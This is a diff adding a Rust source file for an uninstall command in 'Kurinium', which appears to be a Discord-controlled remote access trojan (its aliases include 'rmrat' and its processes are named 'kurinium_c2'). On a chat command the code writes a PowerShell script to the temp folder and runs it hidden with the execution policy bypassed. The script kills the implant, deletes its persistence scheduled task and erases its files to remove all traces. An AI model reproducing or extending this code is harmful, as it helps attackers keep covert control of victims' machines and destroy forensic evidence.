@@ -1,0 +1,86 @@
+use crate::commands::*;
+use crate::config::Config;
+use anyhow::{Context, Result};
+use async_trait::async_trait;
+use std::env;
+use std::fs;
+use std::os::windows::process::CommandExt;
+use std::process::{Command, Stdio};
+use twilight_http::Client as HttpClient;
+use twilight_model::channel::message::Message;
+
+pub struct UninstallCommand;
+
+#[async_trait]
+impl BotCommand for UninstallCommand {
+    fn name(&self) -> &str { "uninstall" }
+    fn description(&self) -> &str { "Removes the Kurinium from the system" }
+    fn category(&self) -> &str { "core" }
+    fn usage(&self) -> &str { ".uninstall" }
+    fn examples(&self) -> &'static [&'static str] { &[] }
+    fn aliases(&self) -> &'static [&'static str] { &["rmrat", "uni"] }
+
+    async fn execute(&self, http: &Arc<HttpClient>, msg: &Message, _args: Arguments) -> Result<()> {
+        http.create_message(msg.channel_id)
+            .content("Uninstalling and removing all traces... Goodbye, cruel world!")
+            .await?;
+
+        self.sched_uninstall()?;
+
+        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
+        std::process::exit(0);
+    }
+}
+
+impl UninstallCommand {
+    fn gen_ps_script(&self) -> Result<String> {
+        let curr_exe = env::current_exe().context("Failed to get current executable path")?;
+        let curr_exe_path = curr_exe.to_string_lossy().to_string();
+        let task_name = Config::get_startup_config().task_name;
+        let install_dir = curr_exe.parent().context("Failed to get parent directory")?;
+        let install_dir_path = install_dir.to_string_lossy().to_string();
+
+        // commnt: script to kill proc, del task, del file, del dir
+        let script = format!(
+            r#"
+Start-Sleep -Seconds 3
+Stop-Process -Name "kurinium_c2" -Force -ErrorAction SilentlyContinue
+Stop-Process -Name "kurinium-c2" -Force -ErrorAction SilentlyContinue
+schtasks /delete /tn "{task_name}" /f
+Remove-Item -Path "{exe_path}" -Force
+Start-Sleep -Seconds 1
+Remove-Item -Path "{dir_path}" -Recurse -Force -ErrorAction SilentlyContinue
+"#,
+            task_name = task_name,
+            exe_path = curr_exe_path,
+            dir_path = install_dir_path
+        );
+
+        Ok(script)
+    }
+
+    fn sched_uninstall(&self) -> Result<()> {
+        let script_content = self.gen_ps_script()?;
+        let tmp_dir = env::temp_dir();
+        let script_path = tmp_dir.join("kurinium_uninstall.ps1");
+
+        fs::write(&script_path, script_content).context("Failed to write uninstall script")?;
+
+        Command::new("powershell.exe")
+            .args([
+                "-ExecutionPolicy",
+                "Bypass",
+                "-WindowStyle",
+                "Hidden",
+                "-File",
+                &script_path.to_string_lossy(),
+            ])
+            .creation_flags(0x08000000) // CREATE_NO_WINDOW
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()
+            .context("Failed to spawn PowerShell for uninstall")?;
+
+        Ok(())
+    }
+}
